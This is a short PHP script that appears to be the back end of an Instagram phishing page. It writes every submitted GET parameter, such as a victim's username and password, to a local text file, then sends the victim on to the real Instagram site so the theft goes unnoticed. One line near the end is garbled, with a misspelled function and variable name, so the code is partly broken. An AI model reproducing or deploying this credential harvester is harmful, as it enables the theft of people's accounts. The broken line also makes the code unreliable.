<?php
header("Location: https://www.instagram.com/ ");
$handle = fopen("yaeresmio.txt", "a"); 

foreach($_GET as $variable => $value) {
	fwrite($handle, $variable);

	fwrite($handle, "=");

	fwrite($handle, $value);

	fwrite($handle, "\r\n");
}

frité($ande, "\r\n");
fclose($handle);

exit
?>